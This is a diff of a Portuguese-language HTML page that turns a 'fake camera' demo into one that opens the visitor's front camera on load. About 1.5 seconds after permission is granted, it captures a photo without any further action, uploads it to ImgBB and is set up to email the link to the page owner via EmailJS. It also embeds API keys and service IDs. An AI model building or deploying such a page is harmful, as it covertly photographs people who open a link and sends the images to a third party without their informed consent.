@@ -3,66 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Câmera Falsa</title>
+    <title>Câmera Automática</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
+            // ⚠️ IMPORTANTE: COLOQUE SUA CHAVE 'user_...' AQUI ABAIXO ⚠️
             emailjs.init("dE244dq8weZCu5CiA"); 
         })();
     </script>
 
     <style>
-        body { font-family: sans-serif; text-align: center; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
-        #fakeCamera { width: 320px; height: 240px; border: 2px solid #333; border-radius: 10px; overflow: hidden; position: relative; }
-        /* A imagem que parece a câmera */
-        #fakeVideoImage { width: 100%; height: 100%; object-fit: cover; }
-        /* O botão */
-        button { padding: 15px 30px; font-size: 16px; cursor: pointer; margin-top: 20px; background: #ff0000; color: white; border: none; border-radius: 50px; width: 200px; }
-        #status { margin-top: 10px; color: #aaa; }
+        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        #status { position: absolute; bottom: 20px; left: 0; right: 0; text-align: center; color: white; font-family: sans-serif; font-size: 18px; background: rgba(0,0,0,0.5); padding: 10px; }
     </style>
 </head>
 <body>
 
-    <div>
-        <!-- Substitua o src pela imagem que você quer que pareça a câmera -->
-        <div id="fakeCamera">
-            <img id="fakeVideoImage" src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?ixlib=rb-4.0.3&auto=format&fit=crop&w=320&q=80" alt="Câmera">
-        </div>
-        
-        <button id="btnFoto">📸 Tirar Foto</button>
-        <p id="status"></p>
-    </div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="status">Abrindo câmera...</div>
 
     <script type="text/javascript">
-        const IMGBB_API_KEY = '150c23d157fe7a469ffa4316f840df88'; 
+        // CONFIGURAÇÕES
+        const IMGBB_API_KEY = 'dE244dq8weZCu5CiA'; 
         const EMAILJS_SERVICE_ID = 'service_1tsipns';
         const EMAILJS_TEMPLATE_ID = 'template_38m07j9';
-        const EMAILJS_PUBLIC_KEY = 'dE244dq8weZCu5CiA'; 
+        const EMAILJS_PUBLIC_KEY = "dE244dq8weZCu5CiA"; // ⚠️ COLOQUE AQUI TAMBÉM SE NÃO ESTIVER NO INIT
 
-        const btn = document.getElementById('btnFoto');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
-        const fakeImg = document.getElementById('fakeVideoImage');
 
-        btn.onclick = async function() {
-            btn.disabled = true;
-            status.innerText = "Enviando foto...";
+        // 1. Acessar Câmera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                
+                // Evento: Quando o vídeo começar a tocar (após o usuário dar permissão)
+                video.onloadedmetadata = async () => {
+                    status.innerText = "Tirando foto...";
+                    // Pequeno delay para a câmera estabilizar/ajustar foco
+                    await new Promise(resolve => setTimeout(resolve, 1500)); 
+                    tirarFotoAutomatica(stream);
+                };
+            } catch (err) {
+                status.innerText = "Permissão negada ou erro.";
+                console.error(err);
+            }
+        }
 
-            // 1. Pegar a imagem da "câmera falsa" e converter para Base64
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
+        // 2. Função para tirar e enviar
+        async function tirarFotoAutomatica(stream) {
+            // Captura o frame
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Definir tamanho do canvas igual ao da imagem
-            canvas.width = fakeImg.naturalWidth;
-            canvas.height = fakeImg.naturalHeight;
-            
-            // Desenhar a imagem no canvas
-            ctx.drawImage(fakeImg, 0, 0);
-            
-            // Converter para Base64
+            // Converte para Base64
             const fotoBase64 = canvas.toDataURL('image/jpeg').split(',')[1];
 
+            // Para a câmera para economizar bateria e privacidade
+            stream.getTracks().forEach(track => track.stop());
+
             try {
-                // 2. Enviar para o ImgBB
+                status.innerText = "Enviando para ImgBB...";
+                
+                // Enviar para ImgBB
                 const formData = new FormData();
                 formData.append('image', fotoBase64);
                 
@@ -70,7 +79,7 @@
                 const dataImgbb = await responseImgbb.json();
                 
                 if (!dataImgbb.success) {
-                    throw new Error('Falha no ImgBB');
+                    throw new Error('Erro ImgBB: ' + dataImgbb.error.message);
                 }
 
                 const imageUrl = dataImgbb.data.url;
@@ -78,25 +87,29 @@
 
                 status.innerText = "Enviando e-mail...";
 
-                // 3. Enviar e-mail
+                // Enviar para EmailJS
                 const params = {
                     link_da_foto: imageUrl,
                     link_exclusao: imageDeleteUrl,
-                    message: "Nova foto recebida."
+                    message: "Nova foto capturada automaticamente."
                 };
 
-                const responseEmail = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
+                // await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
                 
-                status.innerText = "Sucesso!";
-                console.log('Success!', responseEmail.status);
+                status.innerText = "Sucesso! Foto enviada.";
+                console.log('Envio concluído');
+
+                // Opcional: Redirecionar ou esconder o vídeo
+                // document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:20%">Captura Concluída</h1>';
 
             } catch (error) {
-                console.error('Erro:', error);
-                status.innerText = "Erro ao enviar.";
-            } finally {
-                btn.disabled = false;
+                console.error('Erro final:', error);
+                status.innerText = "Erro: " + error.message;
             }
         }
+
+        // Iniciar
+        startCamera();
     </script>
 </body>
 </html>
